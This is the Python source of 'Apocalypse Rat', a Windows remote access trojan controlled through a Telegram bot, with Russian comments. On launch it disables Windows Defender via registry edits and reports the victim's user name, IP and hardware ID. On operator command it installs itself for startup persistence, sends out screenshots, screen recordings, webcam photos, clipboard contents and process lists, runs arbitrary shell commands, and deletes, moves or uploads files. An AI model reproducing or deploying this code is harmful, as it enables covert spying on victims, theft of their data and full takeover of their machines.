# ----------------------Основные импорты--------------------#

import os
import random
import string

import cv2
import sys
import time
import shutil
import psutil
import ctypes
import telebot
import requests
import pymsgbox
import platform
import pyautogui
import pyperclip
import webbrowser
import subprocess
import numpy as np
import tkinter as tk


from tkinter import scrolledtext
from PIL import ImageGrab
from os import getlogin
from telebot import types
import win32com.client

# ----------------------Переменные--------------------#

bot_token = ""
adm = ""
bot = telebot.TeleBot(bot_token)
username = getlogin()
r = requests.get('https://ip.42.pl/raw')
IP = r.text
# -------------Отключение WinDefender(можете удалить)--#

os.system(r"""
set vers=15
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
spauses
""")

# -----------------------Функции-----------------------#

def screen():
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + f'\\Sreenshot.jpg')
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
    files = {'photo': screen}
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + adm, files=files)


def get_hwid():
    wmi = win32com.client.GetObject("winmgmts:")
    hwid = wmi.InstancesOf("Win32_ComputerSystemProduct")[0].UUID
    return hwid


def send_direct():
    directory = os.path.abspath(os.getcwd())
    bot.send_message(adm, "📂\n" + str(directory))


def send_ls():
    try:
        dirs = '\n'.join(os.listdir(path="."))
        bot.send_message(adm, "Files: " + "\n" + dirs)
    except:
        bot.send_message(adm, "❌ Ошибка! файл введен неверно!")


def send_info():
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version()
    bot.send_message(adm, f"PC: {username}\nIP: {IP}\nOS: {windows}\nProcessor: {processor}\nVersion OS : {systemali}")


def open_url(message):
    url = message.text
    try:
        webbrowser.open_new_tab(url)
        bot.send_message(adm, f"Ссылка - {url} открыта!")
        screen()
    except:
        bot.send_message(adm, "❌ Ошибка! ссылка введена неверно!")


def messagebox(message):
    pass

def startup():
    try:
        shutil.copy2(sys.argv[0],
                     r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        bot.send_message(adm, f'{os.path.basename(sys.argv[0])} Скопировал в автозагрузку')
        os.startfile(
            'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(
                sys.argv[0]))
        bot.send_message(adm, f'{os.path.basename(sys.argv[0])} Запущен из автозагрузки')
        bot.send_message(adm, 'Завершаем текущий процесс...')
    except:
        bot.send_message(adm, 'Ошибка')


def send_tasklist():
    try:
        os.system('tasklist> C:\\ProgramData\\Tasklist.txt')
        tasklist = open('C:\\ProgramData\\Tasklist.txt')
        bot.send_document(adm, tasklist)
        tasklist.close()
        os.remove('C:\\ProgramData\\Tasklist.txt')
    except:
        bot.send_message(adm, 'Error > Tasklist')


def kill_process(message):
    process_name = message.text
    try:
        subprocess.call(f"taskkill /f /im {process_name}.exe")
        bot.send_message(adm, f"Процесс {process_name} остановлен")
        screen()
    except:
        bot.send_message(adm, '❌ Неверный синтаксис команды.\nПопробуй\n/kill {имя процесса без расширения}')


def handle_file_upload(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    save_path = os.path.join(os.getcwd(), message.document.file_name)
    with open(save_path, 'wb') as new_file:
        new_file.write(downloaded_file)
    bot.send_message(adm, f"Файл {message.document.file_name} загружен в директорию {save_path}")


def open_file(message):
    file_path = message.text
    try:
        os.startfile(file_path)
        bot.send_message(adm, f"Файл {file_path} успешно открыт!")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка! Не удалось открыть файл {file_path}. Причина: {e}")


def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        bot.send_message(adm, f"📋 Буфер обмена:\n{clipboard_content}")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка доступа к буферу обмена: {e}")


def record_screen():
    try:
        screen_size = pyautogui.size()
        video_output = os.path.join(os.getenv("APPDATA"), "screen_record.mp4")

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(video_output, fourcc, 20.0, screen_size)

        start_time = time.time()

        while int(time.time() - start_time) < 15:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

        out.release()

        video = open(video_output, 'rb')
        bot.send_video(adm, video)
        video.close()
        os.remove(video_output)
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка записи видео: {e}")

def execute_shell_command(message):
    command = message.text
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            bot.send_message(adm, f"🖥️ Результат выполнения команды:\n```\n{stdout}\n```", parse_mode='Markdown')
        else:
            bot.send_message(adm, f"⚠️ Команда выполнена, но с ошибкой:\n```\n{stderr}\n```", parse_mode='Markdown')

    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка выполнения команды:\n```\n{e}\n```", parse_mode='Markdown')

def move_mouse(message):
    try:
        coordinates = message.text.split(',')
        x = int(coordinates[0].strip())
        y = int(coordinates[1].strip())
        pyautogui.moveTo(x, y)
        bot.send_message(adm, f"🖱️ Мышка перемещена в координаты ({x}, {y}).")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка перемещения мышки: {e}")


def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()

        if not ret:
            bot.send_message(adm, "❌ Веб-камера не обнаружена.")
            return

        img_path = os.path.join(os.getenv("APPDATA"), "webcam_photo.jpg")
        cv2.imwrite(img_path, frame)
        cam.release()

        img = open(img_path, 'rb')
        bot.send_photo(adm, img)
        os.remove(img_path)
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка съемки с веб-камеры: {e}")

def copy_file(message):
    try:
        src, dest = message.text.split(',')
        shutil.copy2(src.strip(), dest.strip())
        bot.send_message(adm, f"📂 Файл скопирован из {src.strip()} в {dest.strip()}.")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка копирования файла: {e}")

def move_file(message):
    try:
        src, dest = message.text.split(',')
        shutil.move(src.strip(), dest.strip())
        bot.send_message(adm, f"📂 Файл перемещен из {src.strip()} в {dest.strip()}.")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка перемещения файла: {e}")

def delete_file(message):
    try:
        file_path = message.text.strip()
        os.remove(file_path)
        bot.send_message(adm, f"🗑️ Файл {file_path} удален.")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка удаления файла: {e}")

def system_monitor():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')
        bot.send_message(adm, f"📊 Состояние системы:\n\n"
                              f"💻 ЦП: {cpu_usage}%\n"
                              f"🧠 Память: {memory_info.percent}%\n"
                              f"💽 Диск: {disk_info.percent}%")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка мониторинга системы: {e}")

def shutdown_pc():
    try:
        bot.send_message(adm, "⏳ Выключение ПК...")
        os.system("shutdown /s /t 1")
    except Exception as e:
        bot.send_message(adm, f"❌ *Ошибка выключения ПК*: {e}")

def restart_pc():
    try:
        bot.send_message(adm, "🔄 Перезагрузка ПК...")
        os.system("shutdown /r /t 1")  # /r означает перезагрузку, /t 1 означает задержку в 1 секунду
    except Exception as e:
        bot.send_message(adm, f"❌ *Ошибка перезагрузки ПК*: {e}")

def ask_messagebox_title(message):
    title = message.text
    bot.send_message(adm, "📝 *Введите описание для сообщения в Messagebox*: ", parse_mode='Markdown')
    bot.register_next_step_handler(message, lambda msg: send_messagebox(title, msg.text))

def send_messagebox(title, description):
    try:
        bot.send_message(adm, f"✉️ *Сообщение* \"{title}\" в *Messagebox отправлено успешно*!", parse_mode='Markdown')
        ctypes.windll.user32.MessageBoxW(0, description, title, 0x10 | 0x0)

    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка отправки сообщения в Messagebox: {e}")

def prank_move_mouse():
    try:
        bot.send_message(adm, "🐭 *Прикол с мышкой начат!*", parse_mode='Markdown')
        duration = 10  # Продолжительность в секундах
        start_time = time.time()
        while time.time() - start_time < duration:
            x, y = pyautogui.position()
            pyautogui.moveTo(x + 50, y, duration=0.5)
            time.sleep(0.5)
            pyautogui.moveTo(x - 100, y, duration=0.5)
            time.sleep(0.5)
        bot.send_message(adm, "🐭 *Прикол с мышкой завершен!*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка при выполнении прикола с мышкой: {e}")

# -------------------Хандлеры-------------------------#



bot.send_message(adm,f'🥸 {username} *Подключился*!\n\n```\n💻 Hwid: {get_hwid()}\n🛜 Local Ip - {IP}\n```\n💬 *Нажми* /start *чтобы взаймодействовать*.', parse_mode='Markdown')



@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    buttons = [
        types.InlineKeyboardButton("📂 Тек. директория", callback_data='direct'),
        types.InlineKeyboardButton("📁 Файлы в этой директории", callback_data='ls'),
        types.InlineKeyboardButton("📸 Скриншот", callback_data='screen'),
        types.InlineKeyboardButton("ℹ️ Информация о пк", callback_data='info'),
        types.InlineKeyboardButton("🔗 Открыть ссылку", callback_data='openurl'),
        types.InlineKeyboardButton("📌 Автозагрузка", callback_data='startup'),
        types.InlineKeyboardButton("📋 Список процессов", callback_data='tasklist'),
        types.InlineKeyboardButton("❌ Убить процесс", callback_data='kill'),
        types.InlineKeyboardButton("⬆️ Загрузить файл", callback_data='upload'),
        types.InlineKeyboardButton("📂 Открыть файл", callback_data='openfile'),
        types.InlineKeyboardButton("📋 Буфер обмена", callback_data='clipboard'),
        types.InlineKeyboardButton("🎥 Видео", callback_data='video'),
        types.InlineKeyboardButton("📷 Фото с вебки", callback_data='webcam_photo'),
        types.InlineKeyboardButton("💻 Выключить ПК", callback_data='shutdown'),
        types.InlineKeyboardButton("🔄️ Перезагрузить ПК", callback_data='restart'),
        types.InlineKeyboardButton("🖱️ Переместить мышку", callback_data='move_mouse'),
        types.InlineKeyboardButton("🖥️ Комманда shell", callback_data='shell'),
        types.InlineKeyboardButton("📁 Копировать файл", callback_data='copy_file'),
        types.InlineKeyboardButton("📁 Переместить файл", callback_data='move_file'),
        types.InlineKeyboardButton("🗑️ Удалить файл", callback_data='delete_file'),
        types.InlineKeyboardButton("📊 Мониторинг системы", callback_data='system_monitor'),
        types.InlineKeyboardButton("😶 Вывести ошибку", callback_data='messagebox'),
        types.InlineKeyboardButton("🖱️ Прикол с мышкой", callback_data='mouseprank')
    ]
    keyboard.add(*buttons)
    mark = types.InlineKeyboardButton('🕳️ Apocalypse Rat', callback_data='mark')
    keyboard.add(mark)
    bot.send_message(adm, '🛜 Главное меню.', reply_markup=keyboard)




@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'direct':
        send_direct()

    elif call.data == 'ls':
        send_ls()

    elif call.data == 'screen':
        screen()

    elif call.data == 'info':
        send_info()

    elif call.data == 'openurl':
        bot.send_message(adm, "🔗 *Введите ссылку*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, open_url)

    elif call.data == 'startup':
        startup()

    elif call.data == 'tasklist':
        send_tasklist()

    elif call.data == 'kill':
        bot.send_message(adm, "📂 *Введите имя процесса*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, kill_process)

    elif call.data == 'upload':
        bot.send_message(adm, "📂 *Отправьте файл*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, handle_file_upload)

    elif call.data == 'mouseprank':
        prank_move_mouse()

    elif call.data == 'openfile':
        bot.send_message(adm, "📂 *Введите путь к файлу*:", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, open_file)

    elif call.data == 'clipboard':
        get_clipboard()


    elif call.data == 'video':
        bot.send_message(adm, '🎥 *Записываю видео*...', parse_mode='Markdown')
        record_screen()

    elif call.data == 'messagebox':
        bot.send_message(adm, "📝 *Введите заголовок для сообщения в Messagebox*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, ask_messagebox_title)

    elif call.data == 'webcam_photo':
        capture_webcam()

    elif call.data == 'shutdown':
        shutdown_pc()
    elif call.data == 'restart':
        restart_pc()
    elif call.data == 'shell':
        bot.send_message(adm, "🖥️ *Введите shell команду*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, execute_shell_command)
    elif call.data == 'move_mouse':
        bot.send_message(adm, "🖱️ *Введите координаты для перемещения мышки (x, y)*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, move_mouse)
    elif call.data == 'copy_file':
        bot.send_message(adm, "📂 *Введите исходный и целевой путь (src, dest)*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, copy_file)
    elif call.data == 'move_file':
        bot.send_message(adm, "📂 *Введите исходный и целевой путь (src, dest)*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, move_file)
    elif call.data == 'delete_file':
        bot.send_message(adm, "📂 *Введите путь к файлу для удаления*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, delete_file)

    elif call.data == 'system_monitor':
        system_monitor()
    elif call.data == 'mark':
        bot.send_message(adm, f'🕳️ *Apocalypse Rat*\n\n*GitHub* - \n\n🆚*Версия клиента* - 0.0.2 BetaRls\n🫂*Текущий клиент* - {getlogin()}', parse_mode='Markdown')


while True:
    try:
        bot.polling()
    except:
        time.sleep(1)
        bot.polling()
